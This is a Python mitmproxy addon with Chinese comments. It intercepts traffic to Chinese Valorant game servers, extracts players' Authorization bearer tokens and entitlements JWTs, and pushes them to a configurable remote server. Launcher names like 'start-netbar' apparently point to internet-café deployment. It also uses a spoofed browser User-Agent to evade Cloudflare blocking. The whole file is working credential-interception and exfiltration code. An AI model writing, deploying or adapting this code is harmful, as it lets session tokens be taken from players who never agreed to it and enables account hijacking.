"""
mitmproxy addon: 捕获游戏 GLZ/Entitlements token 并推送到远程服务器。

由 start-netbar.ps1 或 start-user.ps1 通过环境变量配置:
  WGVAL_PUSH_TOKEN    管理口令 (必填)
  WGVAL_PUSH_URL      推送地址 (默认 http://127.0.0.1:8787/api/push-game-token)
  WGVAL_PUSH_SOURCE   来源标签 (默认 netbar)
  WGVAL_PUSH_INTERVAL 同一 token 最小推送间隔秒数 (默认 300)
"""

from __future__ import annotations

import hashlib
import json
import os
import time
import urllib.error
import urllib.request

from mitmproxy import ctx, http


PUSH_URL = os.environ.get("WGVAL_PUSH_URL", "http://127.0.0.1:8787/api/push-game-token").strip()
PUSH_TOKEN = os.environ.get("WGVAL_PUSH_TOKEN", "").strip()
PUSH_SOURCE = os.environ.get("WGVAL_PUSH_SOURCE", "netbar").strip() or "netbar"
PUSH_INTERVAL = max(30, int(os.environ.get("WGVAL_PUSH_INTERVAL", "300")))

# Cloudflare 会拦截 Python-urllib 默认 UA (error 1010), 必须用浏览器风格 UA
HTTP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WGameValPush/1.0"

TARGET_DOMAIN_SUFFIXES = (
    "redge.val.qq.com",
    "entitlements.val.qq.com",
)

CAPTURE_HEADERS = {
    "authorization",
    "x-riot-entitlements-jwt",
    "x-riot-clientversion",
    "x-riot-clientplatform",
    "user-agent",
}

REQUIRED_HEADERS = ("authorization", "x-riot-entitlements-jwt")

# 推送成功后的冷却 (避免重复推送同一 token)
_pushed_cache: dict[str, float] = {}
# 推送失败后的短冷却 (30秒后允许重试, 避免 spam)
_retry_cooldown: dict[str, float] = {}

RETRY_COOLDOWN = 30


def _token_fingerprint(headers: dict[str, str]) -> str:
    parts = [headers.get(k, "") for k in REQUIRED_HEADERS]
    return hashlib.sha256("|".join(parts).encode()).hexdigest()[:16]


def _should_push(fingerprint: str) -> bool:
    now = time.time()
    if now - _pushed_cache.get(fingerprint, 0) < PUSH_INTERVAL:
        return False
    if now - _retry_cooldown.get(fingerprint, 0) < RETRY_COOLDOWN:
        return False
    return True


def _mark_result(fingerprint: str, success: bool) -> None:
    if success:
        _pushed_cache[fingerprint] = time.time()
        _retry_cooldown.pop(fingerprint, None)
    else:
        _retry_cooldown[fingerprint] = time.time()


def _push_token(headers: dict[str, str]) -> None:
    if not PUSH_TOKEN:
        ctx.log.warn("[push] WGVAL_PUSH_TOKEN 未设置, 跳过推送")
        return

    fingerprint = _token_fingerprint(headers)
    if not _should_push(fingerprint):
        ctx.log.info(f"[push] 跳过重复 token ({fingerprint})")
        return

    payload = {"headers": headers, "source": PUSH_SOURCE}
    url = f"{PUSH_URL}?k={PUSH_TOKEN}"
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": HTTP_UA,
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            if 200 <= resp.status < 300:
                ctx.log.info(f"[push] 推送成功 ({fingerprint})")
                _mark_result(fingerprint, True)
            else:
                ctx.log.warn(f"[push] HTTP {resp.status}: {body[:200]}")
                _mark_result(fingerprint, False)
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")[:200]
        ctx.log.warn(f"[push] HTTP {exc.code}: {body}")
        _mark_result(fingerprint, False)
    except Exception as exc:
        ctx.log.warn(f"[push] 推送失败: {type(exc).__name__}: {exc}")
        _mark_result(fingerprint, False)


class PushAddon:
    def load(self, loader) -> None:
        ctx.log.info(f"[push] 推送端点: {PUSH_URL}")
        ctx.log.info(f"[push] 口令: {PUSH_TOKEN[:4]}••••{PUSH_TOKEN[-4:] if len(PUSH_TOKEN) > 8 else '••••'}")
        ctx.log.info(f"[push] 来源标签: {PUSH_SOURCE}")
        if not PUSH_TOKEN:
            ctx.log.warn("[push] ⚠ 口令未设置! 请检查 config.ini")
        # 启动时测试端点连通性
        try:
            req = urllib.request.Request(
                PUSH_URL, method="HEAD",
                headers={"User-Agent": HTTP_UA},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                ctx.log.info(f"[push] 端点连通正常 (HTTP {resp.status})")
        except urllib.error.HTTPError as exc:
            if exc.code in (404, 405, 401):
                ctx.log.info(f"[push] 端点可达 (HTTP {exc.code})")
            else:
                ctx.log.warn(f"[push] 端点异常: HTTP {exc.code}")
        except Exception as exc:
            ctx.log.warn(f"[push] ⚠ 端点不可达: {type(exc).__name__}: {exc}")
            ctx.log.warn(f"[push] 请检查网络/DNS是否能访问 {PUSH_URL}")

    def request(self, flow: http.HTTPFlow) -> None:
        host = flow.request.pretty_host.lower()
        if not any(host.endswith(s) for s in TARGET_DOMAIN_SUFFIXES):
            return

        headers: dict[str, str] = {}
        for key, value in flow.request.headers.items():
            if key.lower() in CAPTURE_HEADERS and value:
                headers[key] = value

        lowered_keys = {k.lower() for k in headers}
        if not all(h in lowered_keys for h in REQUIRED_HEADERS):
            return

        ctx.log.info(f"[push] 捕获 {host} ({len(headers)} 头)")
        _push_token(headers)


addons = [PushAddon()]
